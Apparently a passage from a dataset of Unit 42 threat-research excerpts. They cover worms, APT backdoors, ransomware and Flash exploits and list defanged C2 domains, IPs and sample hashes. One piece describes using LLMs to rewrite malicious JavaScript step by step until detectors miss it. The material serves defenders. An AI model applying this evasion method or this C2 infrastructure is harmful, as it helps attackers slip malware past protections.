SHA256\n513813af1590bc9edeb91845b454d42bbce6a5e2d43a9b0afa7692e4e500b4c8\ne068c6536bf353abe249ad0464c58fb85d7de25223442dd220d64116dbf1e022\n4e40f80114e5bd44a762f6066a3e56ccdc0d01ab2a18397ea12e0bc5508215b8\nRogueRobin SHA256\neb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97\nf1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0\n5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c\nRogueRobin C2s\nakdns[.]live\nakamaiedge[.]live\nedgekey[.]live\nakamaized[.]live\n0ffice365[.]agency\n0nedrive[.]agency\ncorewindows[.]agency\nmicrosoftonline[.]agency\nonedrive[.]agency\nsharepoint[.]agency\nskydrive[.]agency\n0ffice365[.]life\n0ffice365[.]services\nskydrive[.]services\nskydrive[.]agency\nNameservers\ntvs1.trafficmanager[.]live\ntvs2.trafficmanager[.]live\ntbs1.microsoftonline[.]services\ntbs2.microsoftonline[.]services\nbrit.ns.cloudfronts[.]services\ndns.cloudfronts[.]services\nns2.akadns[.]services\nbritns.akadns[.]services\nbritns.akadns[.]live\nns2.akadns[.]live\nRelated Domains\niecvlist-microsoft[.]live\ndata-microsoft[.]services\nasimov-win-microsoft[.]services\nonecs-live[.]services\nakamaiedge[.]services\nphicdn[.]world\nazureedge[.]today\nnsatc[.]agency\nAkamai[.]agency\nt-msedge[.]world", "source": "Palo"}, {"title": "Introduction", "content": "A service mesh platform is a dedicated infrastructure layer that allows for the granular control of how applications share data. A standard use case could be to control the flow and rate of network traffic to a new version of a production web-based application. When the new web application is brought online, it is important to test the application to ensure it can handle a particular level of performance without failing. Service mesh platforms can be leveraged to facilitate how network traffic flows within a network and can be used to load balance the network traffic for a set of web-based applications.\nHowever, service mesh platforms can also provide more insight into what has been a relative black hole for security practitioners within microservice environments: the dynamic monitoring of container processes and their network operations within Kubernetes (K8s) clusters. This blog will shed light on the threats facing cloud microservice architectures and how service mesh platforms likeIstio,LinkerdandConsulcan enhance the visibility of security incidents occurring within K8s clusters.\nDevelopment operations (DevOps) teams design containerized applications to be dynamically scalable, stateless, immutable and ephemeral, as is required to operate and maintain profitability within today's evolving cloud computing landscape.\nHowever, malicious attacker groups likeTeamTNT,WatchDogandNobelium(the group behind theSolarWinds Orion supply chain attack) have been witnessed directly targeting containerized applications. These attacks have resulted in the successful compromise of these ephemeral and immutable instances and have allowed the actors to escape compromised containers \u2013 and launch additional containers designed to perform other nefarious actions.\nSadly, security operations teams are often none the wiser to these activities, as visibility within the K8s cluster is frequently lacking.\nTeamTNT is a prime example of threat actors targeting K8s applications, specifically in terms of their approach to Atlassian's Confluence application. TeamTNT actors areactively using the exploitCVE-2021-26084, however, they arenot the only actor grouptargeting this application either. As of the time of this writing, Shodan lists 976 individually internet-facing Atlassian Confluence servers around the world (see Figure 1), giving TeamTNT and other actor groups several opportunities to compromise cloud systems. While these servers are exposed, they may not be vulnerable to the given exploit.\nThe Atlassian Confluence example paints a vivid picture of active cryptojacking attacks against cloud K8s containers, at least from the perspective of TeamTNT. However, exposed Atlassian Confluence applications running within cloud containers only represent one application.\nCan more popular containerized applications present similar risks? Researchers analyzed the top 20 downloaded container images as listed on Docker Hub. Notable in this analysis, Atlassian's Confluence is not on that list. But little is known about whether attacks are being performed against any of the more popular and potentially more exposed cloud-based applications such as web service applications or database applications. This is the foundation for stating that more visibility is required in order for security resources to detect the threats facing microservice infrastructure.\nPrisma Cloud'sDefender agent offers one step toward the type of visibility discussed.", "source": "Palo"}, {"title": "Conclusion", "content": "Service mesh platforms like Consul, Istio, and Linkerd are paramount to maintaining security best practices within containerized environments. However, their role within the security-focused operations in cloud environments has not been fully developed. Specifically, service mesh platforms can integrate network monitoring tools across all K8s pods and namespacesinto a singlethird-party security-focused application, which dramatically eases security monitoring tasks for security teams.\nPrisma Cloud's Defender agentcan be installed on K8s clusters allowing security teams to monitor the runtime operations of containers hosted on a K8s cluster. Service mesh platforms focus on the network mirroring and monitoring components of data within the K8s cluster. With the ability to monitor, investigate and respond to alerts centered around network traffic within K8s clusters, service mesh platforms provide much-needed visibility into K8s clusters. This visibility can shine a light on the threats that face cloud microservices today. This gives security operation teams the ability to truly monitor and respond to threats facing cloud infrastructure.", "source": "Palo"}, {"title": "Introduction", "content": "On July 11, 2023, Unit 42 cloud researchers discovered a new peer-to-peer (P2P) worm we call P2PInfect. Written in Rust, a highly scalable and cloud-friendly programming language, this worm is capable of cross-platform infections and targets Redis, a popular open-source database application that is heavily used within cloud environments. Redis instances can be run on both Linux and Windows operating systems. Unit 42 researchers have identified over 307,000 unique Redis systems communicating publicly over the last two weeks, of which 934 may be vulnerable to this P2P worm variant. While not all of the 307,000 Redis instances will be vulnerable, the worm will still target these systems and attempt the compromise.\nThe P2PInfect worm infects vulnerable Redis instances by exploiting the Lua sandbox escape vulnerability,CVE-2022-0543. While the vulnerability was disclosed in 2022, its scope is not fully known at this point. However, it is rated in the NIST National Vulnerability Database with a Critical CVSS score of 10.0. Additionally, the fact that P2PInfect exploits Redis servers running on both Linux and Windows operating systems makes it more scalable and potent than other worms. The P2P worm observed by Unit 42 researchers serves as an example of a serious attack threat actors could conduct using this vulnerability.\nP2PInfect exploits CVE-2022-0543 for initial access and then drops an initial payload that establishes P2P communication to a larger P2P network. Once the P2P connection is established, the worm pulls down additional malicious binaries such as OS-specific scripts and scanning software. The infected instance then joins the P2P network to provide access to the other payloads to future compromised Redis instances.\nExploiting CVE-2022-0543 in this way makes the P2PInfect worm more effective at operating and propagating in cloud container environments. This is where Unit 42 researchers discovered the worm by it compromising a Redis container instance within our HoneyCloud environment, which is a set of honeypots that we use to identify and study novel cloud-based attacks across public cloud environments.\nUnit 42 believes this P2PInfect campaign is the first stage of a potentially more capable attack that leverages this robust P2P command and control (C2) network. There are instances of the word \"miner\" within the malicious toolkit of P2PInfect. However, researchers did not find any definitive evidence that cryptomining operations ever occurred. Additionally, the P2P network appears to possess multiple C2 features such as \"Auto-updating\" that would allow the controllers of the P2P network to push new payloads into the network that could alter and enhance the performance of any of the malicious operations. Unit 42 researchers will continue to monitor for changes and update accordingly.\nPalo Alto Networks customers receive protections against the types of threats discussed in this article through products including:\nPrisma Cloud \nAdvanced WildFire \nCloud-Delivered Security Servicesfor theNext-Generation Firewall, includingAdvanced URL FilteringandAdvanced Threat Prevention.\nIf you believe you have been compromised by P2PInfect, theUnit 42 Incident Response teamcan provide a personalized response.", "source": "Palo"}, {"title": "Conclusion", "content": "The P2PInfect worm appears to be well designed with several modern development choices. Key among these is the use of the Rust language, which provides resilient capabilities and the flexibility to allow the worm to rapidly spread across multiple operating systems.\nThe design and building of a P2P network to perform the auto-propagation of malware is not something commonly seen within the cloud targeting or cryptojacking threat landscape. At the same time, we believe it was purpose-built to compromise and support as many Redis vulnerable instances as possible across multiple platforms.\nWe have caught several samples within our HoneyCloud platform, across multiple geographic regions, and we strongly believe the number of P2P nodes is growing. This is due to the volume of potential targets \u2013 over 307,000 Redis instances communicating publicly over the last two weeks \u2013 and since the worm was able to compromise multiple of our Redis honeypots across disparate regions. However, we don't have an estimate yet of how many nodes exist or how fast the malicious network associated with P2PInfect is growing.\nWe recommend that organizations monitor all Redis applications, both on-premises and within cloud environments, to ensure they do not contain random filenames within the/tmpdirectory. Additionally, DevOps personnel should continually monitor their Redis instances to ensure they maintain legitimate operations and maintain network access. All Redis instances should also be updated to their latest versions or anything newer than redis/5:6.0.16-1+deb11u2, redis/5:5.0.14-1+deb10u2, redis/5:6.0.16-2 and redis/5:7.0~rc2-2.\nPalo Alto Networks customers receive protections against the types of threats in the following ways:\nPrisma Cloudis capable of identifying the runtime environment of any cloud Redis instance to ensure it detects and prevents the unknown and malicious execution of the P2PInfect worm. \nCloud-Delivered Security Servicesfor theNext-Generation Firewall include a variety of protections. \nAdvanced URL Filteringblocks malicious IoCs related to this worm. \nAdvanced Threat Preventioncan block the attacks with Best Practices via Threat Prevention signatures92349and93004. \nTheAdvanced WildFirecloud-delivered malware analysis service accurately identifies known samples as malicious.\nIf you think you might have been impacted or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 Samples\nLinux:\n88601359222a47671ea6f010a670a35347214d8592bceaf9d2e8d1b303fe26d7\nMiner:\nb1fab9d92a29ca7e8c0b0c4c45f759adf69b7387da9aebb1d1e90ea9ab7de76c\nWindows:\n68eaccf15a96fdc9a4961daffec5e42878b5924c3c72d6e7d7a9b143ba2bbfa9\nWinMiner:\n89be7d1d2526c22f127c9351c0b9eafccd811e617939e029b757db66dadc8f93\nIPs\n35.183.81[.]182 \n66.154.127[.]38 \n66.154.127[.]39 \n8.218.44[.]75 \n97.107.96[.]14\nCNC Requests\nGET /linux \nGET /linux_sign \nGET /miner \nGET /miner_sigg \nGET /winminer \nGET /winminer_sign \nGET /windows_sign \nGET /windows\nUpdated July 20, 2023, at 1:08 p.m. PT.", "source": "Palo"}, {"title": "Introduction", "content": "We developed an adversarial machine learning (ML) algorithm that uses large language models (LLMs) to generate novel variants of malicious JavaScript code at scale. We have used the results to improve our detection of malicious JavaScript code in the wild by 10%.\nRecently, advancements in the code understanding capabilities of LLMs have raised concerns about criminals using LLMs to generate novel malware. Although LLMs struggle to create malware from scratch, criminals can easily use them to rewrite or obfuscate existing malware, making it harder to detect.\nAdversaries have long used common obfuscation techniques and tools to avoid detection. We can easily fingerprint or detect off-the-shelf obfuscation tools because they are well known to defenders and produce changes in a predefined way. However, criminals can prompt LLMs to perform transformations that are much more natural-looking, which makes detecting this malware more challenging.\nFurthermore, given enough layers of transformations, many malware classifiers can be fooled into believing that a piece of malicious code is benign. This means that as malware evolves over time, either deliberately for evasion purposes or by happenstance, malware classification performance degrades.\nTo demonstrate this, we created an algorithm that uses LLMs to rewrite malicious JavaScript code in a step-by-step fashion. We started with a set of rewriting prompts including the following:\nVariable renaming \nDead code insertion \nRemoving unnecessary whitespace\nTesting samples of malicious code, we continually applied these rewriting steps to allow us to fool a static analysis model. At each step, we also used a behavior analysis tool to ensure the program's behavior remained unchanged.\nUsing this LLM-based rewriting technique, we generated significant reductions in the number of vendors on VirusTotal that detected each sample as malicious.\nTo defend against this type of LLM-assisted attack, we retrained our malicious JavaScript classifier on tens of thousands of LLM-rewritten samples. Our new malicious JavaScript detector is now deployed in ourAdvanced URL Filteringservice. This solution helps better protect Palo Alto Networks customers by detecting thousands of new phishing and malware webpages per week.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Background", "content": "In 2023, news outlets published several articles about \"evil LLMs\" that cybercriminals were touting on the dark web. These evil LLMs (e.g.,WormGPT,FraudGPT) claimed to be jailbroken versions of models that attackers could use to generate novel malware, write phishing emails and perform other malicious tasks.\nUpon closer examination, these claims were largely unsubstantiated in almost all cases. The evil LLMs' users complained about broken formatting, limited context windows and overall poor code understanding and generation abilities.\nAs explained in ourThreat Frontier reporton preparing for emerging AI risks, even closed-source LLMs currently require a significant amount of hand holding to generate any non-trivial malware, limiting their usefulness for attackers.\nInstead of generating malware from scratch, we experimented with using LLMs to rewrite existing malware samples to evade detection. This approach was much more feasible and produced results that were more difficult to detect.", "source": "Palo"}, {"title": "Conclusion", "content": "Although LLMs can struggle when it comes to generating novel malware, they excel at rewriting existing malicious code to evade detection. For defenders, this presents both challenges and opportunities.\nThe scale of new malicious code variants could increase with the help of generative AI. However, we can use the same tactics to rewrite malicious code to help generate training data that can improve the robustness of ML models.\nWe have used these tactics to develop our new deep learning-based malicious JavaScript detector. We retrained this detector on adversarially generated JavaScript samples, and it is currently running inAdvanced URL Filteringdetecting tens of thousands of JavaScript-based attacks each week. Our ongoing research into AI-based threats will help our defenses remain ahead of evolving attack techniques.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Examples of recent phishing URLs:\nbafkreihpvn2wkpofobf4ctonbmzty24fr73fzf4jbyiydn3qvke55kywdi.ipfs.dweb[.]link \njakang.freewebhostmost[.]com/korea/app[.]html \ndub[.]sh/TRVww78?email= \nipfs[.]io/ipfs/bafkreihzqku7sygssd6riocrla7wx6dyh5acszguxaob57z4sfzv5x55cq\nSHA256 hashes of malicious JavaScript samples:\n03d3e9c54028780d2ff15c654d7a7e70973453d2fae8bdeebf5d9dbb10ff2eab \n4f1eb707f863265403152a7159f805b5557131c568353b48c013cad9ffb5ae5f \n3f0b95f96a8f28631eb9ce6d0f40b47220b44f4892e171ede78ba78bd9e293ef", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 has discovered activity involving threat actors responsible for theOilRig campaignwith a potential link to a threat group known asGreenBug. Symantec first reported on this group back in January 2017, detailing their operations and using a custom information stealing Trojan called ISMDoor.\nIn July 2017, we observed an attack on a Middle Eastern technology organization that was also targeted by the OilRig campaign in August 2016. Initial inspection of this attack suggested this was again the OilRig campaign using their existing toolset, but further examination revealed not only new variants of the delivery document we namedClayslide, but also a different payload embedded inside it. In the past, we had primarily associated the OilRig campaign with using the Clayslide documents to deliver as a payload a Trojan we named Helminth; in this instance, the payload was instead a variant of the ISMDoor Trojan with significant modifications which we are now tracking as ISMAgent.", "source": "Palo"}, {"title": "Conclusion", "content": "The OilRig campaign has repeatedly demonstrated a willingness and desire to be iterative in their toolset, while maintaining some level of similarities over time. In this scenario, we were able to directly observe this type of behavior, while also implement a tool thought to be previously unrelated to OilRig. With the inclusion of ISMAgent within the OilRig toolset, we are beginning to see stronger relationships between the various documented groups operating in the Middle East. This region has proven to be a hot bed of espionage motivated activity over the last couple of years, and there appear to be no signs of this changing. As our research continues, our goal will be to generate even better understandings of the true extent of the various operations in this region and the relationships between them.\nPalo Alto Networks customers are protected and may learn more via the following:\nSamples are classified as malicious by WildFire and Traps prevents their execution \nDomains and IPs have been classified as malicious and IPS signatures generated \nAutoFocus users may learn more via theISMAgentandClayslidetags", "source": "Palo"}, {"title": "Indicators", "content": "Clayslide delivering ISMAgent\n3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b65ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902\nISMAgent payloadsbbfc05177e5e29b3c8c4ef0148969d07e6239140da5bff57473c32409e76c07052366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9af4d8604d0cd09b8dc01dbafc33c6d240d356cad366f9917192a2725e0121a0d\nISMAgent C2Adobeproduct[.]comntpupdateserver[.]commicrosoft-publisher[.]com\nRelated infrastructure\nMiedafire[.]comtatavpnservices[.]comchrome-dns[.]comfireeyeupdate[.]comcache-service[.]netlevel3-resolvers[.]netMslicensecheck[.]com", "source": "Palo"}, {"title": "Introduction", "content": "A June 23 FireEye blog post titled \"Operation Clandestine Wolf\" discussed a cyber espionage group, known as APT3, that had been exploiting a zero-day vulnerability in Adobe Flash. Unit 42 also tracks the APT3 group using the name UPS, which is an intrusion set with Chinese origins that is known for having early access to zero-day vulnerabilities and delivering a backdoor called Pirpi.\nThe UPS group has exploited several zero-day vulnerabilities, most recently using the zero-days released in the Hacking Team breach that we discussed in our July 10 blog post, \"APT Group UPS Targets US Government with Hacking Team Flash Exploit\".However, the most recent original zero-day released by this group is tracked by CVE-2015-3113, which has similarities to the once zero-day vulnerabilities CVE-2014-1776 andCVE-2014-6332exploited by UPS in May and November 2014, respectively. We'll discuss here the similarities observed between the various components used to exploit these two vulnerabilities, specifically focusing on the malicious Flash files and the payloads delivered.", "source": "Palo"}, {"title": "Conclusion", "content": "The UPS threat group continues to exploit zero-day vulnerabilities in their campaigns, which shows that this group is quite sophisticated and has access to significant resources. Within their attack campaigns involving zero-days, UPS has consistently reused delivery techniques and code within various components of the attack. UPS has relied on steganography to conceal the payloads delivered after exploitation of zero-days by embedding payloads, specifically the Pirpi backdoor within animated GIFs. This group also reuses portions of their ActionScript within their malicious Flash files used to exploit vulnerabilities, as well as sharing portions of shellcode that executes after exploitation.\nIn regards to similarities amongst payloads, UPS delivers variants of the Pirpi backdoor that are typically very similar to each other. The Pirpi backdoors we analyzed use the same configuration file, a common C2 communications channel and a similar command handler. Also, the author of Pirpi includes several notable fingerprints within the code, specifically using a unique state machine and anti-disassembly techniques. Organizations can use all of these overlaps and similarities to track and hopefully protect themselves from this advanced adversary.AutoFocususers can identify Pirpi payloads with the Pirpi tag (Figure 9).WildFireautomatically classifies Pirpi samples as malicious and we have released IPS signature 14643 to detect Pirpi C2 communications.\nFigure 9. Pirpi tag", "source": "Palo"}, {"title": "Introduction", "content": "In recent years, one of the most common classes of elevation-of-privilege vulnerabilities is file system redirection attacks. This class abuses the fact that a privileged component, such as a Windows service, operates on files or directories that are writable by unprivileged users. By using different types of file system links, such as hard links or junctions, attackers can trick the privileged component into operating on files it didn't intend to. The end goal for such attacks is usually to write an attacker-supplied executable (such as a DLL or a script) to disk, and to get it executed with system permissions.\nSome examples for such exploits can be found inmy BlueHat IL 2020 talk,CVE-2020-0787 Metasploit moduleand many more.\nThis piece explains junctions and how threat actors use them in file system redirection attacks, then explores a developing mitigation.\nPalo Alto Networks customers receive protections from Cortex XDR against exploits for different types of file system redirection attacks.", "source": "Palo"}, {"title": "Conclusion", "content": "In the last few years, Microsoft has pushed numerous mitigations to address file system redirection attacks. It is important to explore them and assess their effectiveness, trying to identify gaps and conditions where bugs can still be exploitable.\nPalo Alto Networks Cortex XDRalready has many protections in place to prevent exploits for different types of file system redirection attacks, and was proven to prevent such attacks in the wild.", "source": "Palo"}, {"title": "Introduction", "content": "This blog presents the answers for ourFebruary 2023 Unit 42 Wireshark quiz. The information is ideal for security professionals who investigate suspicious network activity in an Active Directory (AD) environment, but everyone is welcome to review. To get the most benefit, readers should understand basic network traffic concepts and be familiar withWireshark.\nIf you'd like to view the version without answers, please seethe standalone quiz post.", "source": "Palo"}, {"title": "Conclusion", "content": "This blog provides answers to our Unit 42 Wireshark quiz for February 2023. We reviewed traffic from the pcap and presented an incident report based on the infection.\nMany organizations lack access to full packet capture in their IT environment. As a result, security professionals may lack experience in reviewing network traffic. Training material like this Wireshark quiz can help. Pcap analysis is a useful skill that helps us better understand malicious activity. Incident reports help investigators organize their findings in a more easily digestible format, and security professionals with incident report-writing experience are better able to recognize similar activity. A well-written report helps other people within your organization take appropriate steps to prevent the incident from happening again.\nYou can also read the original post, without answers, for this month'sUnit 42 Wireshark quiz.\nPalo Alto Networks customers receive protections from this type of malware throughCortex XDRand ourNext-Generation FirewallwithCloud-Delivered Security ServicesincludingWildFireandAdvanced Threat Prevention.\nIf you think you may have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200", "source": "Palo"}, {"title": "Indicators", "content": "Infrastructure\nhxxp://128.254.207[.]55/86607.dat \n102.156.32[.]143:443 \n208.187.122[.]74:443 \n5.75.205[.]43:443 \n23.111.114[.]52:65400 \n78.31.67[.]7:443 \nSHA256 hash for Qakbot DLL file \n713207d9d9875ec88d2f3a53377bf8c2d620147a4199eb183c13a7e957056432", "source": "Palo"}, {"title": "Introduction", "content": "Royal ransomware has been involved in high-profile attacks against critical infrastructure, especially healthcare, since it was first observed in September 2022. Bucking the popular trend of hiring affiliates to promote their threat as a service, Royal ransomware operates as a private group made up of former members of Conti.\nThe Unit 42 team has observed this group compromising victims through a BATLOADER infection, which threat actors usually spread through search engine optimization (SEO) poisoning. This infection involves dropping a Cobalt Strike Beacon as a precursor to the ransomware execution. Unit 42 incident responders have participated in 15 cases involving Royal ransomware in the last 9 months.\nRoyal ransomware also expanded their arsenal by developing an ELF variant to impact Linux and ESXi environments. The ELF variant is quite similar to the Windows variant, and the sample does not contain any obfuscation. All strings, including the RSA public key and ransom note, are stored as plaintext.\nPalo Alto Networks customers receive protections against ransomware used by the Royal ransomware group from Cortex XDR, as well as from the WildFire Cloud-Delivered Security Service for the Next-Generation Firewall. The Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Conclusion", "content": "Royal ransomware has been more active this year, using a wide variety of tools and more aggressively targeting critical infrastructure organizations. Organizations should implement security best practices and be wary of the ongoing threat of ransomware. This is true not only for Royal ransomware but for other opportunistic criminal groups as well.\nThe Unit 42 team recommends that defenders have advanced logging capabilities deployed and configured properly. This includes tools such asSysmon, Windows command-line logging and PowerShell logging.\nIdeally, you should be forwarding these logs to a security information and event management tool (SIEM) to create queries and detection opportunities. Keep computer systems patched and up to date wherever possible to reduce the attack surface related to exploitation techniques.\nDeploy an XDR/EDR solution to perform in-memory inspection and detect process injection techniques. Perform threat hunting looking for signs of unusual behavior related to security product defense evasion, service accounts for lateral movement and domain administrator-related user behavior.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 recently identified a new, difficult-to-detect remote access trojan named PingPull being used by GALLIUM, an advanced persistent threat (APT) group.\nUnit 42 actively monitors infrastructure associated with several APT groups. One group in particular,GALLIUM(also known as Softcell), established its reputation by targeting telecommunications companies operating in Southeast Asia, Europe and Africa. The group's geographic targeting, sector-specific focus and technical proficiency, combined with their use of known Chinese threat actor malware and tactics, techniques and procedures (TTPs), has resulted in industryassessmentsthat GALLIUM is likely a Chinese state-sponsored group.\nOver the past year, this group has extended its targeting beyond telecommunication companies to also include financial institutions and government entities. During this period, we have identified several connections between GALLIUM infrastructure and targeted entities across Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia and Vietnam. Most importantly, we have also identified the group's use of a new remote access trojan named PingPull.\nPingPull has the capability to leverage three protocols (ICMP, HTTP(S) and raw TCP) for command and control (C2). While the use of ICMP tunneling is not a new technique, PingPull uses ICMP to make it more difficult to detect its C2 communications, as few organizations implement inspection of ICMP traffic on their networks. This blog provides a detailed breakdown of this new tool as well as the GALLIUM group's recent infrastructure.\nPalo Alto Networks customers receive protections from the threats described in this blog throughThreat Prevention,Advanced URL Filtering,DNS Security,Cortex XDRandWildFiremalware analysis.\nFull visualization of the techniques observed, relevant courses of action and indicators of compromise (IoCs) related to this report can be found in theUnit 42 ATOM viewer.", "source": "Palo"}, {"title": "Conclusion", "content": "GALLIUM remains an active threat to telecommunications, finance and government organizations across Southeast Asia, Europe and Africa. Over the past year, we have identified targeted attacks impacting nine nations. This group has deployed a new capability called PingPull in support of its espionage activities, and we encourage all organizations to leverage our findings to inform the deployment of protective measures to defend against this threat group.\nSpecial thanks to the NSA Cybersecurity Collaboration Center, the Australian Cyber Security Centre and other government partners for their collaboration and insights offered in support of this research.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Samples\nde14f22c88e552b61c62ab28d27a617fb8c0737350ca7c631de5680850282761b4aabfb8f0327370ce80970c357b84782eaf0aabfc70f5e7340746f25252d541fc2147ddd8613f08dd833b6966891de9e5309587a61e4b35408d56f43e72697ec55ab8fdd060fb532c599ee6647d1d7b52a013e4d8d3223b361db86c1f43e845f86ebeb6b3c7f12ae98fe278df707d9ebdc17b19be0c773309f9af599243d0a38b664300fff1238d6c741ac17294d714098c5653c3ef992907fc498655ff7c20\u200b\u200b1ce1eb64679689860a1eacb76def7c3e193504be53ebb0588cddcbde9d2b9fe6\nPingPull C2 Locations\ndf.micfkbeljacob[.]comt1.hinitial[.]com5.181.25[.]5592.38.135[.]625.8.71[.]97\nDomains\nmicfkbeljacob[.]comdf.micfkbeljacob[.]comjack.micfkbeljacob[.]comhinitial[.]comt1.hinitial[.]comv2.hinitial[.]comv3.hinitial[.]comv4.hinitial[.]comv5.hinitial[.]comgoodjob36.publicvm[.]comgoodluck23.jp[.]ushelpinfo.publicvm[.]comMailedc.publicvm[.]com\nIP Addresses\n(Active in last 30 days)\n92.38.135[.].625.181.25[.]555.8.71[.]97101.36.102[.]34101.36.102[.]93101.36.114[.]167101.36.123[.]191103.116.47[.]65103.179.188[.]93103.22.183[.]131103.22.183[.]138103.22.183[.]141103.22.183[.]146103.51.145[.]143103.61.139[.]71103.61.139[.]72103.61.139[.]75103.61.139[.]78103.61.139[.]79103.78.242[.]62118.193.56[.]130118.193.62[.]232123.58.196[.]208123.58.198[.]205123.58.203[.]19128.14.232[.]56152.32.165[.]70152.32.203[.]199152.32.221[.]222152.32.245[.]157154.222.238[.]50154.222.238[.]51165.154.52[.]41165.154.70[.]51167.88.182[.]166176.113.71[.]622.58.242[.]2302.58.242[.]2312.58.242[.]235202.87.223[.]27212.115.54[.]5437.61.229[.]10445.116.13[.]15345.128.221[.]6145.128.221[.]6645.136.187[.]9845.14.66[.]23045.154.14[.]13245.154.14[.]16445.154.14[.]18845.154.14[.]25445.251.241[.]7445.251.241[.]8245.76.113[.]16347.254.192[.]7992.223.30[.]23292.223.30[.]5292.223.90[.]17492.223.93[.]14892.223.93[.]22292.38.139[.]17092.38.149[.]10192.38.149[.]24192.38.171[.]12792.38.176[.]47107.150.127[.]124118.193.56[.]131176.113.71[.]168185.239.227[.]12194.29.100[.]1732.58.242[.]23645.128.221[.]18245.154.14[.]19147.254.250[.]11779.133.124[.]88103.137.185[.]249103.61.139[.]74107.150.112[.]211107.150.127[.]140146.185.218[.]65152.32.221[.]242165.154.70[.]62176.113.68[.]12185.101.139[.]176188.241.250[.]152188.241.250[.]153193.187.117[.]144196.46.190[.]272.58.242[.]2292.58.242[.]23237.61.229[.]10645.128.221[.]17245.128.221[.]18645.128.221[.]22945.134.169[.]147103.170.132[.]199107.150.110[.]233152.32.255[.]145167.88.182[.]107185.239.226[.]203185.239.227[.]3445.128.221[.]16945.136.187[.]41137.220.55[.]3845.133.238[.]234103.192.226[.]4392.38.149[.]885.188.33[.]237146.185.218[.]17643.254.218[.]10443.254.218[.]5743.254.218[.]9892.223.59[.]8443.254.218[.]4381.28.13[.]4889.43.107[.]191103.123.134[.]145103.123.134[.]161103.123.134[.]165103.85.24[.]81212.115.54[.]24143.254.218[.]11489.43.107[.]190103.123.134[.]139103.123.134[.]240103.85.24[.]121103.169.91[.]93103.169.91[.]9445.121.50[.]230\nUpdated June 13, 2022, at 4:45 a.m. PT", "source": "Palo"}, {"title": "Introduction", "content": "As part of a new series of regular threat report updates to the public covering different sets of countries from around the EMEA (Europe Middle East and Africa) region, this blog covers the emerging and Middle East region focusing on Turkey, Saudi Arabia & United Arab Emirates for April and May, and leads on from my previous blog about theUnited Kingdom, Germany and France. This new series will dig deeper into current trends, the threats affecting each country, and provide useful tips for mitigating these threats via our AutoFocus Threat Intelligence Service.\nIn my previous blogs, I introduced the EMEA region at a high-level\u2013 a large group of countries each with mixed languages, cultures, and cybersecurity maturity levels. Each also has different industry sectors and different economic profiles, which in turn creates a very diverse environment potentially ripe for cyberattacks.", "source": "Palo"}, {"title": "Conclusion", "content": "EMEA is a socially and economically diverse region with many interesting assets whether they be citizen data, financial information, or natural resources and, as such, is a target for cyber criminals the world over.\nIt's probably no surprise to see ransomware as a prevalent malware crossing all borders into all countries as this malware is mostly victim-agnostic. Any data on any computer in any country is a viable target. We saw a slight change in TTPs (Tools Techniques and Procedures) with one ransomware family, Jaff, which made use of weaponized Word documents embedded inside PDF droppers (AutoFocus tag: PdfDocmDropper) perhaps to bypass increased security measures around the traditional Word document containers.\nAs per the last report, Spora ransomware accounted for some of the ransomware prevalence, and was delivered over web-browsing application, which differs from the traditional malspam email campaigns.\nClearly Remote Access Trojans and information-stealing malware are prevalent in these countries and their emerging markets.", "source": "Palo"}, {"title": "Introduction", "content": "What follows is a detailed analysis of the root cause of a vulnerability we call CVE-2015-X, as well as a step-by-step explanation of how to trigger it. For more on Flash vulnerabilities, we also invite you to read \"The Latest UAF Vulnerabilities in Exploit Kits,\" published May 28 by Tao Yan.\nNot too long ago we came across a sample from the Angler Exploit kit (MD5: 049ff69bc23f36a78d86bbf1356c2f63c),which allegedly exploits CVE-2015-0359. The obfuscated SWF contains an encoded SWF (MD5: d45808cfa6f3cbfb343fdea269fdc375), which is later decoded and loaded into Flash, without getting saved on disk. Here's a somewhat beautified example of this process:\nThe embedded SWF is heavily obfuscated, but the code has much in common with thesource code for Angler EK's CVE-2015-0313 exploit.\nThe first thing to do is determine whether the exploit is indeed for CVE-2015-0359. Some researchersthink that it's not. The embedded SWF contains a function we namedCheckEnvironment, which eventually does this:\nWe note thatplayerVerOkistrueif the Flash player's version is at least 13.0.0.250, but older than 13.0.0.269, or if the player's version is at least 15.0.0.189, but older than 16.0.0.305. However, the function returnstruefor any of the aforementioned versions, plus versions 13.0.0.277 and 17.0.0.134.\nWe can see that if none of those versions is present, no exploitation occurs:\nWhat's more interesting, though, is that the exact exploit (vulnerability triggering) is chosen based on the version of Flash, like 